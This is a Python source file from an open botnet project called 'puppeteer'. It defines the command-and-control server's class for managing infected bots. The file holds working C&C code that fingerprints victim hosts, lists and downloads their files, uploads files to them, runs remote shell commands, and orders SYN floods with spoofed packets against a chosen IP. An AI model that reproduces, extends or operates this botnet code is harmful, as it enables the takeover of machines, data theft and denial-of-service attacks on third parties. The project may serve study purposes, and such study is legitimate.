"""
    MIT License
    Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>

    This module belongs to https://github.com/arthur-bryan/puppeteer:
    A implementation of a botnet using Python on server (C&C) side
    and C on the bots side.

    This module contains the class that represents the Bots, with the
    responsible methods for interacting with the server
"""

from hashlib import md5
from datetime import datetime
import os
import socket
import struct
from config import MAX_COMMAND_OUTPUT_SIZE, INT_C_SIZE
from config import to_red, to_green, to_yellow


class Puppet:
    """ Class that represents the bot and its methods to interact with the
        server

    Attributes:
        socket_fd (:obj: 'socket'):     object with socket methods
        ip_address (str):               IP address of the bot
        is_connected (int):             status of the connection with the server
        autorun_is_enabled (int):       bot have autorun set
        op_system (str):                bot operating system
        architecture (str):             bot SO architecture
        kernel_release (str):           the current kernel release
        hostname (str):                 bot hostname
        username (str):                 bot logged in username
        last_connection (str):          date and time of the last connection
        id_hash (str):                  bot hash identifier

    """

    def __init__(self, socket_fd, ip_address):
        """ Args:
                socket_fd (:obj: 'socket'): the socket file descriptor
                ip_address (str):           IP address of the bot

        """
        self.socket_fd = socket_fd
        self.ip_address = ip_address
        self.is_connected = 1
        self.autorun_is_enabled = 0
        self.op_system = ""
        self.architecture = ""
        self.kernel_release = ""
        self.hostname = ""
        self.username = ""
        self.last_connection = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
        self.id_hash = ""
        self.set_info()

    def __str__(self):
        """ String representation of the bot

            Returns:
                str:    representation of the bot with its IP, OS and arch

        """
        return f"Puppet {self.ip_address} {self.op_system} {self.architecture}"

    def set_info(self):
        """ Gets the bot info over the socket and fills the object attributes
            with the respectives responses.
            After sending the 'send info' command (that start the requests for
            the bot informations), it will receive and convert bytes to integer
            (the lenght of the next string to be received, in bytes), and then
            receive the the respective string and assignts it to the respective
            object attribute. This proccess will repeat for each attribute to
            ensure that the bytes are being received correctly

        """
        self.socket_fd.send(bytes("send info", "utf-8"))
        op_system_strlen = self.recv_int(INT_C_SIZE)
        self.op_system = self.socket_fd.recv(op_system_strlen).decode("utf-8")
        arch_strlen = self.recv_int(INT_C_SIZE)
        self.architecture = self.socket_fd.recv(arch_strlen).decode("utf-8")
        kernel_strlen = self.recv_int(INT_C_SIZE)
        self.kernel_release = self.socket_fd.recv(kernel_strlen).decode("utf-8")
        hostname_strlen = self.recv_int(INT_C_SIZE)
        self.hostname = self.socket_fd.recv(hostname_strlen).decode("utf-8")
        username_strlen = self.recv_int(INT_C_SIZE)
        self.username = self.socket_fd.recv(username_strlen).decode("utf-8")
        self.autorun_is_enabled = self.recv_int(INT_C_SIZE)
        self.set_id_hash()

    def set_id_hash(self):
        """ Sets the hash attribute based on some of the othres attributes """
        string = self.architecture
        string += self.op_system
        string += self.kernel_release
        string += self.hostname
        string += self.username
        self.id_hash = md5(string.encode()).hexdigest()

    def disconnect(self):
        """ Sets the bot connection status to 0 on database and closes the
            socket

        """
        self.socket_fd.send(bytes("exit", 'utf-8'))
        print(to_red(f"\n[ - ] {self.ip_address} disconnected\n"))
        self.is_connected = 0
        self.socket_fd.close()

    def list_files(self):
        """ Sends the list files command to the bot then receives and prints
            its output

        """
        self.socket_fd.send(bytes("list files", 'utf-8'))
        directory = input(to_yellow("[ LIST FILES ] Path: "))
        self.socket_fd.send(bytes(directory, 'utf-8'))
        output = self.socket_fd.recv(MAX_COMMAND_OUTPUT_SIZE).decode('utf-8')
        print(f"\n{output}")

    def send_file(self):
        """ Downloads specified file from the bot and writes it to the disk
            at the specified path

        """
        source_path = input(to_yellow("[ DOWNLOAD ] Path to file: "))
        destination_path = input(to_yellow("[ DOWNLOAD ] Save as: "))

        if source_path == "" or destination_path == "":
            return
        if os.path.exists(destination_path):
            print(to_red(f"\n[ ! ] File exists: {destination_path}\n"))
            return
        self.socket_fd.send(bytes("upload", 'utf-8'))
        self.socket_fd.send(bytes(source_path, 'utf-8'))
        file_size = self.socket_fd.recv(1024)
        buffer = int.from_bytes(file_size, "little")
        file_data = self.recv_all(buffer)
        with open(destination_path, "wb") as file:
            file.write(file_data)
            file.close()
        print(to_green(f"\n[ {self.ip_address} ] File {destination_path} "
                       f"downloaded successfully\n"))

    def receive_file(self):
        """ Uploads a specified file to the bot and saves it at the specified
            path

        """
        source_path = input(to_yellow("[ UPLOAD ] Source path: "))
        destination_path = input(to_yellow("[ UPLOAD ] Destination path: "))
        if source_path == "" or destination_path == "":
            return
        if not os.path.exists(source_path):
            print(to_red(f"\n[ ! ] Invalid source path: {source_path}\n"))
            return
        try:
            with open(source_path, "rb") as file:
                file_size = os.path.getsize(source_path)
                file_size = struct.pack(">I", socket.htonl(file_size))
                self.socket_fd.send(bytes("download", 'utf-8'))
                self.socket_fd.send(file_size)
                len_filename = len(destination_path)
                len_filename = struct.pack(">I", socket.htonl(len_filename))
                self.socket_fd.send(len_filename)
                self.socket_fd.send(bytes(destination_path, 'utf-8'))
                file_data = file.read()
                self.socket_fd.sendall(file_data)
        except (FileNotFoundError, socket.error) as error:
            if "No such file or directory" in error:
                print(to_red(f"\n[ ! ] File not found: {source_path}\n"))
                return
            print(to_red(f"\n[ {self.ip_address} ] Socket error: "
                         f"{error}\n"))
            return
        else:
            print(to_green(f"\n[ {self.ip_address} ] File {source_path} "
                           f"uploaded successfully \n"))

    def run_command(self, command):
        """ Sends a shell command to be executed on the bot without grabbing its
            stdout and stderror

        """
        self.socket_fd.send(bytes("remote cmd", 'utf-8'))
        self.socket_fd.send(bytes(command, 'utf-8'))

    def syn_flood(self):
        """ Floods the specified destination IP with forged packets with
            a specified spoofed IP address

        """
        try:
            self.socket_fd.send(bytes("syn flood", "utf-8"))
            # source_ip = input(to_yellow("[ SYN FLOOD ] Source IP to use: "))
            # self.socket_fd.send(bytes(source_ip, "utf-8"))
            destination_ip = input(to_yellow("[ SYN FLOOD ] Destination IP: "))
            self.socket_fd.send(bytes(destination_ip, "utf-8"))
        except socket.error:
            print(to_red(f"\n[ {self.ip_address} ] Socket error\n"))
        else:
            print(to_green(f"\n[ Flooding ] {self.ip_address}"
                           f" -> {destination_ip}:80\n"))

    def recv_all(self, len_buffer):
        """ Receives all len_buffer bytes and returns the received data

            Args:
                len_buffer (int):   total number of bytes to receive

            Returns:
                read_data (:obj: 'bytes'):  the received data

        """
        read_data = b""
        while len(read_data) < len_buffer:
            read_data += self.socket_fd.recv(3000000)
        return read_data

    def recv_int(self, size):
        """ Receives size bytes, convert it to little endian integer then
            returns

            Args:
                size (int):     number of bytes to receive

            Returns:
                :obj: 'int':    the received bytes converted to integer

        """
        integer = self.socket_fd.recv(size)
        integer = int.from_bytes(integer, "little")
        return integer
